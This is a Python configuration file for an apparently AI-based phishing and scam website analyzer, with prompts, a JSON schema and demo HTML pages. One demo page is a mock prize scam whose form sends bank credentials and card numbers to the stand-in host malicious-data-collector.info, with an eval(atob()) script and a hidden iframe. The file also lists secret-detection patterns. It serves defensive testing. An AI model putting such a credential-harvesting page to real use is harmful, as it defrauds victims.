from typing import Dict
# from langchain_core.prompts import ChatPromptTemplate

SYSTEM_PROMPT = """
You are a world-class cybersecurity anaylst and web developer expert specializing in detecting online scams, phishing, and malicious websites. Your task is to analyze the provided HTML source code of a website and identify potential threats.

Based on your analysis, provide a structured JSON response. Do not include any text, code block markers, or formatting outside of the single, raw JSON object.
"""

ANALYSIS_PROMPT = """
You are an expert cybersecurity analyst and web developer. Your mission is to meticulously analyze website source code for any signs of malicious activity, phishing, or scams. Your tone should be professional, objective, and clear.

Your response MUST be a single, raw JSON object, without any markdown formatting or explanatory text outside of the JSON structure itself.

Carefully analyze the provided source code for the following red flags:

- **Phishing Techniques**: Look for forms that deceptively ask for sensitive credentials (usernames, passwords) or financial details (credit card numbers, CVV). Pay close attention to forms that mimic legitimate services but submit data to a suspicious URL.
- **Malicious Scripts**: Identify any obfuscated or minified JavaScript that is difficult to read. Look for unusual encoding, excessive string concatenation, or dynamic script loading from untrusted or non-standard sources. Also, check for scripts that perform unexpected actions, like browser-based crypto mining.
- **Deceptive Content**: Scan for text that creates a false sense of urgency ("Act now, only 5 minutes left!"), employs scare tactics ("Your computer is at risk!"), or uses fake testimonials and unbelievable promises.
- **Misleading Links & Redirects**: Analyze `<a>` tags where the link text is deceptive (e.g., "Click here for your bank" but the `href` points elsewhere). Also, identify any hidden or automatic redirects to malicious sites.
- **Technical Red Flags**: Check for the use of iframes that load suspicious third-party content. Note the absence of a privacy policy or contact information. Be aware of any typosquatting hints in domain names if they are visible in the code.
- **Poor Code Quality**: Unusually messy, broken, or outdated HTML and JavaScript can sometimes indicate a hastily-constructed scam page.
- **Exposed Secrets**: While another specialized scan will run for this, make a note of any obvious private API keys, private credentials, or private keys you might find.

For each finding that includes a `codeSnippet`, you MUST also provide the `fileName` (the URL of the sub-page) and the approximate `lineNumber`. The code snippet should be concise and only include the most relevant lines to illustrate the issue.

Your response MUST conform to the provided JSON schema.
"""

SECRET_ANALYSIS_PROMPT = """
You are a cybersecurity analyst specializing in secrets detection. Your task is to analyze the following content and identify any exposed secrets.

Look for patterns that indicate secrets like API keys (e.g., starting with 'sk_' for OpenAI, 'AKIA' for AWS), private keys (e.g., "-----BEGIN RSA PRIVATE KEY-----"), or credentials (e.g., username/password pairs in plaintext).

For each secret you find, provide the following details:
- A `codeSnippet` that shows the secret and its immediate context.
- The `fileName` (the URL of the sub-page).
- The approximate `lineNumber` where the secret was found.

Your response MUST be a single, raw JSON object that conforms to the provided schema, and the category for each finding should be "Exposed Secrets".
"""

ANALYSIS_SCHEMA = {
    "type": "object",
    "properties": {
        "overallRisk": {
            "type": "string",
            "enum": ["Low", "Medium", "High", "Very High", "Unknown"],
            "description": "The overall risk assessment.",
        },
        "riskScore": {
            "type": "integer",
            "description": "A score from 0 (safe) to 100 (high risk).",
        },
        "summary": {
            "type": "string",
            "description": "A one-sentence summary of the findings.",
        },
        "detailedAnalysis": {
            "type": "array",
            "description": "A list of specific issues found.",
            "items": {
                "type": "object",
                "properties": {
                    "category": {
                        "type": "string",
                        "enum": [
                            "Phishing",
                            "Malicious Script",
                            "Deceptive Content",
                            "Misleading Links",
                            "Technical Red Flags",
                            "Poor Code Quality",
                            "Exposed Secrets",
                        ],
                        "description": "Category of the issue (e.g., Phishing, Malicious Script, Exposed Secrets).",
                    },
                    "description": {
                        "type": "string",
                        "description": "Detailed explanation of the issue.",
                    },
                    "severity": {
                        "type": "string",
                        "enum": ["Low", "Medium", "High", "Very High"],
                        "description": "Severity of the specific issue.",
                    },
                    "codeSnippet": {
                        "type": "string",
                        "description": "A relevant snippet of the suspicious code, if applicable.",
                    },
                    "fileName": {
                        "type": "string",
                        "description": "The source URL of the file where the code snippet was found.",
                    },
                    "lineNumber": {
                        "type": "integer",
                        "description": "The approximate line number of the code snippet in the source file.",
                    },
                },
                "required": ["category", "description", "severity"],
            },
        },
    },
    "required": ["overallRisk", "riskScore", "summary", "detailedAnalysis"],
}

DEMO_SITES: Dict[str, str] = {
    "demo-safe.com": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My Awesome Blog</title>
    <style>body { font-family: sans-serif; }</style>
</head>
<body>
    <header><h1>Welcome to My Blog</h1></header>
    <main>
        <article>
            <h2>My First Post</h2>
            <p>This is a paragraph in my first blog post. It's safe and sound.</p>
        </article>
    </main>
    <footer>
        <p>&copy; 2024 My Awesome Blog</p>
        <a href="/privacy">Privacy Policy</a>
    </footer>
</body>
</html>""",
    "demo-scam.com": """
<!DOCTYPE html>
<html>
<head>
<title>Free Luxury Prizе!! Clаim Nоw!</title>
</head>
<body style="background-color:yellow; font-family: 'Comic Sans MS', cursive, sans-serif;">
    <h1 style="color:red; text-align:center; font-size: 50px;">CONGRATULATIONS!!! YOU WON!</h1>
    <p style="text-align:center; font-size: 24px;">You have been selected to receive a FREE luxury car! This offer is valid for 5 minutes ONLY!</p>
    <div style="margin: 50px; padding: 20px; border: 5px dashed red;">
        <h2 style="color:blue;">To claim your PRIZE, enter your details below:</h2>
        <form action="http://malicious-data-collector.info/submit" method="post">
            <label for="username">Bank Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Bank Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <label for="cc">Credit Card Number:</label><br>
            <input type="text" id="cc" name="cc"><br><br>
            <input type="submit" value="CLAIM MY FREE CAR NOW!" style="background-color:green; color:white; font-size:30px; padding:20px;">
        </form>
    </div>
    <p>See what other winners are saying!</p>
    <p>"I couldn't believe it! I won a new yacht!" - John S. (real person)</p>
    <script>
      // Obfuscated script to make it harder to read
      eval(atob('Y29uc29sZS5sb2coIlNlbmRpbmcgeW91ciBkYXRhIHRvIHVzLi4uIik7'));
    </script>
    <iframe src="http://suspicious-ad-network.net/ads" width="1" height="1" style="display:none;"></iframe>
</body>
</html>""",
}

SCAM_SITE = """
<!DOCTYPE html>
<html>
<head>
<title>Free Luxury Prizе!! Clаim Nоw!</title>
</head>
<body style="background-color:yellow; font-family: 'Comic Sans MS', cursive, sans-serif;">
    <h1 style="color:red; text-align:center; font-size: 50px;">CONGRATULATIONS!!! YOU WON!</h1>
    <p style="text-align:center; font-size: 24px;">You have been selected to receive a FREE luxury car! This offer is valid for 5 minutes ONLY!</p>
    <div style="margin: 50px; padding: 20px; border: 5px dashed red;">
        <h2 style="color:blue;">To claim your PRIZE, enter your details below:</h2>
        <form action="http://malicious-data-collector.info/submit" method="post">
            <label for="username">Bank Username:</label><br>
            <input type="text" id="username" name="username"><br>
            <label for="password">Bank Password:</label><br>
            <input type="password" id="password" name="password"><br><br>
            <label for="cc">Credit Card Number:</label><br>
            <input type="text" id="cc" name="cc"><br><br>
            <input type="submit" value="CLAIM MY FREE CAR NOW!" style="background-color:green; color:white; font-size:30px; padding:20px;">
        </form>
    </div>
    <p>See what other winners are saying!</p>
    <p>"I couldn't believe it! I won a new yacht!" - John S. (real person)</p>
    <script>
      // Obfuscated script to make it harder to read
      eval(atob('Y29uc29sZS5sb2coIlNlbmRpbmcgeW91ciBkYXRhIHRvIHVzLi4uIik7'));
    </script>
    <iframe src="http://suspicious-ad-network.net/ads" width="1" height="1" style="display:none;"></iframe>
</body>
</html>"""

SAFE_SITE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>My Awesome Blog</title>
    <style>body { font-family: sans-serif; }</style>
</head>
<body>
    <header><h1>Welcome to My Blog</h1></header>
    <main>
        <article>
            <h2>My First Post</h2>
            <p>This is a paragraph in my first blog post. It's safe and sound.</p>
        </article>
    </main>
    <footer>
        <p>&copy; 2024 My Awesome Blog</p>
        <a href="/privacy">Privacy Policy</a>
    </footer>
</body>
</html>"""


# ANALYZER_PROMPT = ChatPromptTemplate.from_messages(
#     [
#         (
#             "system",
#             SYSTEM_PROMPT
#         ),
#         (
#             "human",
#             f"{ANALYSIS_PROMPT}\n The output must follow this JSON schema: {ANALYSIS_SCHEMA}",
#         ),
#     ]
# )
